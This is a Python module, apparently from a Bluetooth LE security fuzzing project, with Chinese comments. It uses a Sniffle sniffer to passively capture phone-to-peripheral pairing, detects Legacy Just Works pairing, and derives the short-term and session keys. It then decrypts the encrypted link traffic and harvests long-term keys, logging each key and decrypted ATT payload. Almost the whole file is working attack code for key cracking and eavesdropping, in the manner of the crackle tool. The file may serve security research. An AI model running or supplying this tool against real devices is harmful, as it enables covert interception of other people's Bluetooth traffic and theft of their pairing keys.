#!/usr/bin/env python3
# att-fuzz/roles/pairing_sniff.py
"""
被动嗅探配对与密钥收割(阶段四 4.1,攻击面密钥收割优先路线)。

单板被动嗅探:setup_sniffer(CONN_FOLLOW, 目标外设 MAC) -> 跟随手机↔外设的
配对连接 -> 全程抓包(pcap + jsonl 双录)。SMP(CID 0x0006)帧单独解析落台账;
配对方式帧级判定(SC vs Legacy Just Works);Legacy Just Works(TK=0)推导 STK ->
抓 LL_ENC_REQ/RSP(SKDm/SKDs/IVm/IVs)算会话密钥 -> AES-CCM 逐包解密后续流量
(含密钥分发帧,收割 LTK)。

设计边界(逐行核对 crackle/kernel smp.c + sniff_receiver.py):
- 字节序:SMP/crypto 字段空口序(小端)在 SmpExchange 内;调用 bt_crypto 时逆序
  成大端(c1/s1/会话密钥);CCM nonce 的 IV 部分保持空口序(crackle 约定)。
- 加密边界靠 MIC 兜底(cackle 同款):cipher 就绪后逐包尝试解密,MIC 过=加密、
  失败=明文(握手控制帧 ENC_REQ/RSP/START_ENC 等),无需精确卡时序。
- 方向:data_dir=0 -> C->P(master->slave, m2s);=1 -> P->C(s2m)。
- 计数器:每方向独立,空包也推进(重传靠 SN 位 + MIC 验证兜底)。

用法(经 runner.py):
  python3 att-fuzz/runner.py --target ... --sniff-pairing --sniff-duration 180 \
      [--sniff-mac AA:BB:..] [--phone-mac AA:BB:..]
  --sniff-mac 省略 = 猎取模式(默认):无 MAC 过滤 + extadv 跟扩展广播 aux 链,
  每条 CONNECT_IND 落台账(--phone-mac 标记手机发起的配对连接)。
  --sniff-mac 给定 = 定向模式:MAC 过滤 + hop3,只抓连到该地址的 CONNECT_IND。
"""

import json
import logging
import time
from pathlib import Path
from struct import unpack

from sniffle.constants import BLE_ADV_AA
from sniffle.pcap import PcapBleWriter
from sniffle.packet_decoder import ConnectIndMessage, DataMessage, DPacketMessage
from sniffle.sniffle_hw import (DebugMessage, MeasurementMessage, PacketMessage,
                                SniffleHW, SnifferState, StateMessage, make_sniffle_hw,
                                PhyMode)

from core import bt_crypto
from core.serial_lock import guard as serial_guard
from core.smp import SmpExchange
from core.transport import _L2capReassembly

log = logging.getLogger("att-fuzz.pairing_sniff")

ATT_CID = 0x0004
SMP_CID = 0x0006
L2CAP_HDR_LEN = 4

# LL control opcodes(加密握手)
LL_ENC_REQ = 0x03
LL_ENC_RSP = 0x04
LL_START_ENC_REQ = 0x05
LL_START_ENC_RSP = 0x06


def _parse_mac(mac_str) -> bytes:
    """书写序 AA:BB:.. -> 线序(小端)6 字节(固件 cmd_mac 用线序)。"""
    mac = bytes.fromhex(str(mac_str).replace(":", "").replace("-", ""))
    return mac[::-1]


def run(target: dict, outdir: Path, serport=None, duration: float = 0.0,
        mac: str | None = None, phone_mac: str | None = None) -> int:
    outdir = Path(outdir)
    outdir.mkdir(parents=True, exist_ok=True)
    serport = serport or target.get("serport")
    with serial_guard(serport, "CLI pairing_sniff(被动嗅探)"):
        return _run_locked(target, outdir, serport, duration, mac, phone_mac)


# 串口 desync 自愈参数(上轮实测:XDS110/UART 丢字节引发 decode error 连环 + pyserial
# "no data",pcap 与台账一起断粮):10 秒窗口内 decode error >= 阈值即复位重同步。
DESYNC_WINDOW_S = 10.0
DESYNC_THRESHOLD = 10


def _run_locked(target, outdir, serport, duration, mac_override,
                phone_mac=None) -> int:
    hw = make_sniffle_hw(serport)
    from sniffle.sniffle_hw import SnifferMode

    # 两种模式:
    # - 定向模式(--sniff-mac 给定):MAC 过滤 + hop3 跳 37/38/39,只抓连到该地址的
    #   CONNECT_IND(上轮已验证能抓到,但配对目标地址未知时抓不到)。
    # - 猎取模式(--sniff-mac 省略,默认):MAC 过滤器全开(hop3 不可用,需目标),
    #   固件 STATIC 态=ch37 常听 + auxadv 跟扩展广播 aux 链(覆盖 AUX_CONNECT_REQ
    #   数据信道路径)。每个 ConnectIndMessage 落台账,靠 phone_mac 识别配对连接。
    hunt = mac_override is None
    wire_mac = _parse_mac(mac_override) if not hunt else None
    phone_wire = _parse_mac(phone_mac) if phone_mac else None

    def _setup():
        if hunt:
            hw.setup_sniffer(mode=SnifferMode.CONN_FOLLOW, chan=37, targ_mac=None,
                             hop3=False, ext_adv=True, coded_phy=False,
                             rssi_min=-128, interval_preload=[],
                             phy_preload=PhyMode.PHY_2M,
                             pause_done=False, validate_crc=True)
        else:
            # 定向驻留(--sniff-mac 给定):MAC 过滤 + 固定 ch37 不跳(hop3=False)。
            # 实测依据:耳机配对广播 86.7% 在 ch37(ch39 13.3%/ch38 ~0),hop3 的
            # 跳变窗口恰是 CONNECT_IND 被漏的窗口(实测 2 中 1);驻留 ch37 对
            # 主信道确定性覆盖,无跳变空窗。
            hw.setup_sniffer(mode=SnifferMode.CONN_FOLLOW, chan=37,
                             targ_mac=wire_mac, hop3=False, ext_adv=False,
                             coded_phy=False, rssi_min=-128, interval_preload=[],
                             phy_preload=PhyMode.PHY_2M,
                             pause_done=False, validate_crc=True)

    mode_desc = "hunt(无MAC过滤+extadv)" if hunt else \
                "park(mac=%s 驻留ch37)" % (wire_mac.hex() if wire_mac else "?")
    log.info("sniff mode: %s, pause_done=False(断连继续跟随)", mode_desc)
    _setup()
    hw.mark_and_flush()

    pcap = PcapBleWriter(str(outdir / "capture.pcap"))
    ledger_path = outdir / "sniff_ledger.jsonl"
    ex = SmpExchange()
    rx = _L2capReassembly()
    state = {"cipher": None, "encrypting": False, "skdm": None, "skds": None,
             "iv": None, "conn_no": 0}
    started = time.time()
    conn_ts = [None]

    def record(**fields):
        rec = {"ts": round(time.time(), 6), "conn": state["conn_no"]}
        rec.update(fields)
        with open(ledger_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")

    record(kind="sniff_start", mode=mode_desc, target=wire_mac.hex() if wire_mac else None,
           phone_mac=phone_wire.hex() if phone_wire else None, duration=duration)
    log.info("sniffing... (手机恢复出厂+删除配对后重新配对)")

    # 串口 desync 自愈状态
    decode_errs = []          # [(t, err)] 时间戳窗口
    desync_count = [0]

    def _storm_check(t, err):
        decode_errs.append((t, err))
        while decode_errs and t - decode_errs[0][0] > DESYNC_WINDOW_S:
            decode_errs.pop(0)
        return len(decode_errs) >= DESYNC_THRESHOLD

    def _desync_recover(reason):
        desync_count[0] += 1
        gap_start = time.time()
        log.warning("decode error storm (%s) -- resetting firmware for resync", reason)
        record(kind="desync_recovery_start", reason=reason,
               pending_errors=len(decode_errs))
        decode_errs.clear()
        try:
            hw.cmd_reset()
        except Exception as e:
            log.warning("cmd_reset failed: %s", e)
        time.sleep(2.0)
        # XDS110 复位后 CDC 假就绪:重开串口
        try:
            hw.ser.close()
            hw.ser.open()
        except Exception as e:
            log.warning("serial reopen failed: %s", e)
        _setup()
        hw.mark_and_flush()
        record(kind="desync_recovery_done", gap_s=round(time.time() - gap_start, 3))
        log.info("resync done in %.1fs, continue sniffing", time.time() - gap_start)

    try:
        while True:
            if duration and time.time() - started >= duration:
                log.info("duration reached, stopping")
                break
            try:
                msg = hw.recv_and_decode()
            except Exception as e:
                log.debug("recv error: %s", e)
                if _storm_check(time.monotonic(), repr(e)[:60]):
                    _desync_recover("recv: %s" % repr(e)[:40])
                continue
            if msg is None:
                continue
            if isinstance(msg, PacketMessage):
                # recv_and_decode 已用 hw.decoder_state 完成类型化解码(含扩展广播
                # aux 状态机);再裸调 DPacketMessage.decode(msg) 会因缺 dstate 在
                # aux 包上崩('NoneType' has no 'aux_pending_scan_rsp')--不重解码。
                # 解码失败时 recv_and_decode 自身已兜底返回原始 PacketMessage。
                try:
                    pcap.write_packet_message(msg)
                except Exception:
                    pass
                if isinstance(msg, ConnectIndMessage):
                    _on_connect(msg, ex, state, record, conn_ts, phone_wire)
                elif isinstance(msg, DataMessage):
                    _on_data(msg, ex, state, record, rx)
            elif isinstance(msg, StateMessage):
                record(kind="state", new=msg.new_state.name, old=msg.last_state.name)
                # 连接跟随结束判定:离开 DATA 态(pause_done=False 下会回
                # STATIC/ADVERT_SEEK 而不是 PAUSED)即一次连接完成
                if (msg.last_state == SnifferState.DATA
                        and msg.new_state != SnifferState.DATA
                        and conn_ts[0] is not None):
                    _on_disconnect(ex, state, record, conn_ts)
            elif isinstance(msg, MeasurementMessage):
                # TerminateMeasurement 等量测
                record(kind="measurement", type=type(msg).__name__,
                       value=getattr(msg, "value", None))
            elif isinstance(msg, DebugMessage):
                record(kind="fw_debug", msg=msg.msg)
    except KeyboardInterrupt:
        log.info("interrupted by user")
    finally:
        try:
            pcap.output.close()
        except Exception:
            pass
        log.info("=== sniff summary ===")
        log.info("connections seen: %d", state["conn_no"])
        s = ex.summary()
        for k, v in s.items():
            log.info("  %s: %s", k, v)
        record(kind="sniff_summary", **s)
        log.info("ledger: %s", ledger_path)
        log.info("pcap:   %s", outdir / "capture.pcap")
    return 0


def _on_connect(dpkt, ex, state, record, conn_ts, phone_wire=None):
    ia = bytes(dpkt.InitA); ra = bytes(dpkt.AdvA)
    iat = 1 if dpkt.TxAdd else 0   # InitA 类型
    rat = 1 if dpkt.RxAdd else 0   # AdvA 类型
    ex.set_addresses(ia, ra, iat, rat)
    state["conn_no"] += 1
    state["cipher"] = None
    state["encrypting"] = False
    state["skdm"] = state["skds"] = state["iv"] = None
    conn_ts[0] = time.time()
    is_phone = bool(phone_wire and ia == phone_wire)
    log.info("conn#%d CONNECT_IND: %s->%s aa=%08X%s", state["conn_no"],
             ia.hex(), ra.hex(), dpkt.aa_conn,
             " <-- 手机发起(配对连接候选)" if is_phone else "")
    record(kind="connect", aa="%08X" % dpkt.aa_conn, init=ia.hex(), adv=ra.hex(),
           iat=iat, rat=rat, interval=dpkt.Interval, is_phone=is_phone,
           ch=dpkt.chan, ts_off=dpkt.ts)


def _on_data(dpkt, ex, state, record, rx):
    body = dpkt.body
    if len(body) < 2:
        return
    header_byte = body[0]
    data_len = dpkt.data_length
    payload = body[2:2 + data_len]
    llid = header_byte & 0x03
    direction = bt_crypto.DIR_M2S if dpkt.data_dir == 0 else bt_crypto.DIR_S2M
    sn = (header_byte >> 3) & 0x01

    if llid == 0x03:
        # LL control(明文,即使加密链路上控制帧也走明文 MIC 兜底)
        _on_ll_control(payload, ex, state, record)
        return

    # data PDU(llid 0/1/2):加密则先解密
    frag = payload
    if state["cipher"] is not None and len(payload) >= 4:
        ct, mic = payload[:-4], payload[-4:]
        pt = state["cipher"].decrypt_packet(header_byte, ct, mic, direction, sn)
        if pt is not None:
            state["encrypting"] = True
            frag = pt
            # 密文包体长度(含 MIC)与解密后明文长度不同 -- 重算无意义,直接用 frag
    sdu, cid, _trunc = rx.feed(llid, frag)
    if sdu is None:
        return
    if cid == SMP_CID:
        rec = ex.feed(sdu)   # sdu 已含 SMP opcode 起始
        record(kind="smp", dir=direction, op=rec.get("opcode"),
               name=rec.get("name"), pdu=sdu.hex()[:80])
        _maybe_finalize_keys(ex, state, record)
    elif cid == ATT_CID and state["encrypting"]:
        record(kind="att_decrypted", dir=direction, op=sdu[0] if sdu else None,
               pdu=sdu.hex()[:120])
        log.info("conn#%d decrypted ATT op=0x%02X: %s", state["conn_no"],
                 sdu[0] if sdu else -1, sdu.hex()[:40])


def _on_ll_control(payload, ex, state, record):
    if not payload:
        return
    opc = payload[0]
    if opc == LL_ENC_REQ and len(payload) >= 23:
        # opcode + Rand(8) + EDIV(2) + SKDm(8) + IVm(4)
        state["skdm"] = payload[11:19]      # 空口序
        state["iv"] = (state["iv"] or b"") + payload[19:23]   # IVm 段
        record(kind="ll_enc_req", rand=payload[1:9].hex(),
               ediv=payload[9:11].hex(), skdm=state["skdm"].hex(),
               ivm=payload[19:23].hex())
        log.info("LL_ENC_REQ: SKDm=%s IVm=%s", state["skdm"].hex(),
                 payload[19:23].hex())
        _maybe_finalize_keys(ex, state, record)
    elif opc == LL_ENC_RSP and len(payload) >= 13:
        # opcode + SKDs(8) + IVs(4)
        state["skds"] = payload[1:9]
        # IV = IVm || IVs(IVm 已在 ENC_REQ 存入 iv 的前 4 字节,这里补 IVs)
        ivm = state["iv"][:4] if state["iv"] else b"\x00" * 4
        state["iv"] = ivm + payload[9:13]
        record(kind="ll_enc_rsp", skds=state["skds"].hex(), ivs=payload[9:13].hex())
        log.info("LL_ENC_RSP: SKDs=%s IVs=%s", state["skds"].hex(),
                 payload[9:13].hex())
        _maybe_finalize_keys(ex, state, record)
    elif opc in (LL_START_ENC_REQ, LL_START_ENC_RSP):
        record(kind="ll_start_enc", op=opc)
        log.info("LL_START_ENC op=0x%02X (encryption engaged)", opc)


def _maybe_finalize_keys(ex, state, record):
    """STK + SKDm/SKDs + IV 齐全即构造解密 cipher(legacy Just Works 路径)。"""
    if state["cipher"] is not None:
        return
    stk = ex.derive_stk()
    if stk is None or state["skdm"] is None or state["skds"] is None \
            or state["iv"] is None or len(state["iv"]) < 8:
        return
    # session key = e(STK, SKDs_be || SKDm_be);IV 保持空口序
    from core.smp import _rev
    skdm_be = _rev(state["skdm"], 8); skds_be = _rev(state["skds"], 8)
    sessk = bt_crypto.session_key(stk, skdm_be, skds_be)
    state["cipher"] = bt_crypto.LLCipherState(sessk, state["iv"][:8])
    record(kind="cipher_ready", stk=stk.hex(), session_key=sessk.hex(),
           iv=state["iv"][:8].hex(), sc=ex.is_secure_connections)
    log.info("cipher ready: STK=%s sessionKey=%s iv=%s (SC=%s)",
             stk.hex(), sessk.hex(), state["iv"][:8].hex(),
             ex.is_secure_connections)


def _on_disconnect(ex, state, record, conn_ts):
    s = ex.summary()
    dur = round(time.time() - conn_ts[0], 3) if conn_ts[0] else None
    record(kind="conn_end", dur_s=dur, **s)
    log.info("conn#%d end: SC=%s legacy=%s stk=%s ltk=%s",
             state["conn_no"], s["secure_connections"], s["legacy_method"],
             s["stk"], s["ltk"])
    # 清空 ex 准备下一连接
    ex.__init__()


